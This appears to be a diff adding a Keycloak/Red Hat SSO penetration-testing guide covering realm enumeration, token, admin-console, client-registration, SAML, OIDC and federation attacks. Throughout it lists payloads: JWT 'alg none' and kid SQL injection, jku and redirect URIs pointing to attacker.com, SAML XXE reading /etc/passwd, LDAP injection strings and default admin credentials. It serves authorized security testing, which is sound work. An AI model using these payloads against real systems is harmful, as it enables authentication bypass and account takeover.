@@ -1,0 +1,485 @@
+<keycloak_security_guide>
+<title>KEYCLOAK / RED HAT SSO SECURITY TESTING</title>
+
+<critical>Keycloak is a widely-used identity and access management solution. Misconfigurations in realm settings, client registration, token validation, and federation can lead to authentication bypass, privilege escalation, and account takeover. Testing must cover all aspects of the Keycloak deployment.</critical>
+
+<scope>
+- Realm configuration issues
+- Token validation bypass
+- Admin console exploitation
+- Client registration abuse
+- SAML/OIDC misconfigurations
+- User federation attacks
+- Brute force protection bypass
+</scope>
+
+<methodology>
+1. Identify Keycloak instances and version information.
+2. Enumerate realms, clients, and configuration.
+3. Test authentication flows for bypass.
+4. Analyze token handling and validation.
+5. Probe admin console access.
+6. Test SAML and OIDC implementations.
+</methodology>
+
+<realm_configuration>
+<realm_discovery>
+{% raw %}
+# Realm enumeration and discovery:
+
+# Well-known endpoints:
+GET /realms/{realm}/.well-known/openid-configuration
+GET /realms/{realm}/.well-known/uma2-configuration
+GET /auth/realms/{realm}/.well-known/openid-configuration
+
+# Common realm names:
+master, default, internal, corporate, dev, staging, prod
+
+# Realm info endpoint:
+GET /realms/{realm}
+# Returns public realm configuration
+
+# Admin realm (master):
+GET /admin/master/console/
+GET /auth/admin/master/console/
+
+# Realm metadata:
+GET /realms/{realm}/protocol/saml/descriptor
+GET /realms/{realm}/clients-registrations/default
+{% endraw %}
+</realm_discovery>
+
+<realm_vulnerabilities>
+{% raw %}
+# Realm configuration issues:
+
+# 1. Password policy:
+# Check minimum length, complexity requirements
+# Test weak password acceptance
+
+# 2. Brute force protection:
+# Test if lockout is enabled
+# Check lockout threshold and duration
+
+# 3. Self-registration:
+# If enabled, register arbitrary accounts
+POST /realms/{realm}/protocol/openid-connect/registrations
+
+# 4. Email verification bypass:
+# Register without email verification
+# Check if unverified accounts can authenticate
+
+# 5. Remember me:
+# Test session duration with remember me
+# Check for excessive token lifetimes
+
+# 6. Account linking:
+# Test if social logins can link without verification
+{% endraw %}
+</realm_vulnerabilities>
+</realm_configuration>
+
+<token_attacks>
+<token_validation>
+{% raw %}
+# Token validation bypass:
+
+# 1. Algorithm confusion:
+# Change alg to "none"
+{"alg": "none", "typ": "JWT"}
+
+# 2. Key confusion:
+# RS256 -> HS256 with public key as secret
+
+# 3. Kid manipulation:
+# Inject SQL in kid header
+{"kid": "' UNION SELECT 'secret' --"}
+# Path traversal in kid
+{"kid": "../../../../../../dev/null"}
+
+# 4. JKU/X5U attacks:
+# Point to attacker-controlled key server
+{"jku": "https://attacker.com/keys.json"}
+
+# 5. Token reuse:
+# Replay expired tokens
+# Use tokens across realms
+
+# 6. Scope escalation:
+# Request additional scopes
+# Modify scope claim in token
+{% endraw %}
+</token_validation>
+
+<token_endpoints>
+{% raw %}
+# Token endpoint testing:
+
+# Standard token endpoint:
+POST /realms/{realm}/protocol/openid-connect/token
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=password&client_id={client}&username={user}&password={pass}
+
+# Token introspection:
+POST /realms/{realm}/protocol/openid-connect/token/introspect
+token={token}&client_id={client}&client_secret={secret}
+
+# Token exchange:
+POST /realms/{realm}/protocol/openid-connect/token
+grant_type=urn:ietf:params:oauth:grant-type:token-exchange
+&subject_token={token}
+&requested_token_type=urn:ietf:params:oauth:token-type:access_token
+
+# Test exchanging tokens across realms
+# Test impersonation via exchange
+{% endraw %}
+</token_endpoints>
+</token_attacks>
+
+<admin_console>
+<admin_access>
+{% raw %}
+# Admin console exploitation:
+
+# Default credentials:
+admin:admin
+admin:password
+keycloak:keycloak
+
+# Admin console endpoints:
+/admin/master/console/
+/auth/admin/master/console/
+/admin/{realm}/console/
+
+# Admin REST API:
+GET /admin/realms
+GET /admin/realms/{realm}/users
+GET /admin/realms/{realm}/clients
+
+# Master realm admin:
+# Has access to all realms
+POST /admin/realms/{realm}/users
+# Create admin user in target realm
+
+# Role enumeration:
+GET /admin/realms/{realm}/roles
+GET /admin/realms/{realm}/clients/{id}/roles
+{% endraw %}
+</admin_access>
+
+<admin_vulnerabilities>
+{% raw %}
+# Admin console vulnerabilities:
+
+# 1. CSRF in admin actions:
+# Check for CSRF tokens in admin API
+# Test state-changing operations
+
+# 2. IDOR in admin API:
+# Access other realm resources
+GET /admin/realms/{other_realm}/users
+
+# 3. Privilege escalation:
+# Lower privilege admin escalating to realm-admin
+# Client-level admin accessing realm settings
+
+# 4. Admin impersonation:
+POST /admin/realms/{realm}/users/{userId}/impersonate
+# Check if impersonation is properly restricted
+
+# 5. Session fixation:
+# Admin session handling
+# Cookie security attributes
+
+# 6. Info disclosure:
+GET /admin/serverinfo
+GET /admin/realms/{realm}/events
+{% endraw %}
+</admin_vulnerabilities>
+</admin_console>
+
+<client_attacks>
+<client_registration>
+{% raw %}
+# Dynamic client registration abuse:
+
+# Client registration endpoint:
+POST /realms/{realm}/clients-registrations/default
+Content-Type: application/json
+Authorization: Bearer {initial_access_token}
+
+{
+  "clientId": "malicious-client",
+  "redirectUris": ["https://attacker.com/callback"],
+  "webOrigins": ["https://attacker.com"],
+  "publicClient": false
+}
+
+# Open registration:
+# If no initial access token required:
+POST /realms/{realm}/clients-registrations/openid-connect
+
+# Client update:
+PUT /realms/{realm}/clients-registrations/default/{clientId}
+# Update redirect URIs to attacker domain
+
+# Redirect URI bypass:
+"redirectUris": [
+  "https://legitimate.com/callback",
+  "https://attacker.com/*"
+]
+{% endraw %}
+</client_registration>
+
+<client_vulnerabilities>
+{% raw %}
+# Client configuration issues:
+
+# 1. Weak client secret:
+# Brute force client credentials
+# Check for hardcoded secrets
+
+# 2. Public client abuse:
+# Public clients don't require secret
+# Token theft via redirect
+
+# 3. Implicit flow:
+# Token in URL fragment
+# Referer leakage
+
+# 4. PKCE bypass:
+# Skip code_challenge for confidential clients
+# Weak code_verifier acceptance
+
+# 5. Consent bypass:
+# Clients with consent required: false
+# Full scope access without user consent
+
+# 6. Scope misconfiguration:
+# Client with excessive default scopes
+# Admin scopes on regular clients
+{% endraw %}
+</client_vulnerabilities>
+</client_attacks>
+
+<saml_attacks>
+<saml_vulnerabilities>
+{% raw %}
+# SAML implementation testing:
+
+# 1. Signature bypass:
+# Remove signature from assertion
+# Modify signed content after signing
+
+# 2. XML signature wrapping:
+# Classic XSW attacks
+<Signature><SignedInfo>...</SignedInfo></Signature>
+<evil:Assertion>...</evil:Assertion>
+<Assertion><!-- original signed --></Assertion>
+
+# 3. XXE in SAML:
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:AuthnRequest>
+  <saml:Issuer>&xxe;</saml:Issuer>
+</samlp:AuthnRequest>
+
+# 4. SAML assertion replay:
+# Replay valid assertion to different SP
+# Check NotOnOrAfter validation
+
+# 5. Recipient validation:
+# Modify Recipient attribute
+# Send to different endpoint
+
+# 6. InResponseTo bypass:
+# Remove or modify InResponseTo
+# Use assertion without matching request
+{% endraw %}
+</saml_vulnerabilities>
+
+<saml_endpoints>
+{% raw %}
+# SAML endpoint testing:
+
+# IDP metadata:
+GET /realms/{realm}/protocol/saml/descriptor
+
+# SAML authentication:
+GET /realms/{realm}/protocol/saml
+POST /realms/{realm}/protocol/saml
+
+# Assertion consumer:
+POST /realms/{realm}/broker/{idp}/endpoint
+
+# SLO (Single Logout):
+GET /realms/{realm}/protocol/saml/logout
+
+# Artifact resolution:
+SOAP endpoint for artifact binding
+
+# Test with SAML Raider or similar tools
+{% endraw %}
+</saml_endpoints>
+</saml_attacks>
+
+<oidc_attacks>
+<oidc_vulnerabilities>
+{% raw %}
+# OIDC implementation testing:
+
+# 1. Redirect URI manipulation:
+# Open redirect in authorize endpoint
+?redirect_uri=https://attacker.com
+?redirect_uri=https://legitimate.com@attacker.com
+?redirect_uri=https://legitimate.com%2F..%2Fattacker.com
+
+# 2. State/nonce validation:
+# Missing state parameter
+# Predictable state values
+# Nonce reuse in ID tokens
+
+# 3. Authorization code theft:
+# Referrer leakage
+# Code in browser history
+
+# 4. ID token validation:
+# Audience (aud) not validated
+# Issuer (iss) not validated
+# Expiration (exp) ignored
+
+# 5. Userinfo endpoint:
+GET /realms/{realm}/protocol/openid-connect/userinfo
+# Check for excessive claims
+
+# 6. Logout vulnerabilities:
+GET /realms/{realm}/protocol/openid-connect/logout
+# CSRF in logout
+# Session not properly invalidated
+{% endraw %}
+</oidc_vulnerabilities>
+</oidc_attacks>
+
+<federation_attacks>
+<identity_federation>
+{% raw %}
+# User federation vulnerabilities:
+
+# 1. LDAP injection:
+# In federated user lookup
+username=*)(objectClass=*)
+username=admin)(&(password=*
+
+# 2. Federation sync:
+# Test sync frequency
+# Race conditions during sync
+
+# 3. Identity provider manipulation:
+# Add malicious identity provider
+# Modify existing IDP configuration
+
+# 4. Account linking:
+# Link attacker account to victim
+# Bypass verification in linking flow
+
+# 5. Just-in-time provisioning:
+# Register via federated IDP
+# Attribute manipulation during provisioning
+
+# 6. Federation trust:
+# Trust misconfigured IDPs
+# Cross-realm federation issues
+{% endraw %}
+</identity_federation>
+
+<social_login>
+{% raw %}
+# Social login vulnerabilities:
+
+# 1. OAuth state fixation:
+# Fix state to known value
+# CSRF via social login
+
+# 2. Email verification bypass:
+# Social provider with unverified email
+# Link without verification
+
+# 3. Account enumeration:
+# Different errors for existing accounts
+# Timing differences
+
+# 4. Token theft:
+# Social provider tokens exposed
+# Insufficient scope validation
+
+# 5. Provider impersonation:
+# Configure malicious social provider
+# Phish credentials
+{% endraw %}
+</social_login>
+</federation_attacks>
+
+<common_payloads>
+{% raw %}
+# Realm discovery:
+GET /realms/master/.well-known/openid-configuration
+
+# Admin console:
+GET /admin/master/console/
+
+# Token endpoint:
+POST /realms/{realm}/protocol/openid-connect/token
+grant_type=password&client_id=admin-cli&username=admin&password=admin
+
+# Client registration:
+POST /realms/{realm}/clients-registrations/default
+
+# Redirect URI bypass:
+?redirect_uri=https://legit.com%2F@attacker.com/callback
+
+# SAML XXE:
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate realm configuration exposure.
+2. Show token validation bypass technique.
+3. Prove admin console access or vulnerability.
+4. Document client registration abuse.
+5. Provide reproducible attack chain.
+</validation>
+
+<false_positives>
+- Properly configured brute force protection
+- Strict redirect URI validation
+- Disabled dynamic client registration
+- Proper signature validation for SAML/JWT
+- Admin console properly secured
+- User federation with proper filtering
+</false_positives>
+
+<impact>
+- Authentication bypass
+- Account takeover
+- Privilege escalation to admin
+- Cross-realm access
+- Session hijacking
+- Data exfiltration via federation
+</impact>
+
+<pro_tips>
+1. Always check the master realm for misconfigurations.
+2. Test both admin API and console access.
+3. Enumerate all clients and their configurations.
+4. Check SAML implementations for signature issues.
+5. Test OIDC flows for state and redirect bypass.
+6. Verify token lifetimes and refresh behavior.
+7. Check user federation for injection points.
+8. Test social login linking carefully.
+9. Look for CVEs specific to Keycloak version.
+10. Document realm and client configurations.
+</pro_tips>
+
+<remember>Keycloak's complexity creates many attack surfaces. From realm configuration to federation, each component can introduce vulnerabilities. Always test comprehensively across authentication flows, admin access, and integrated identity providers.</remember>
+</keycloak_security_guide>
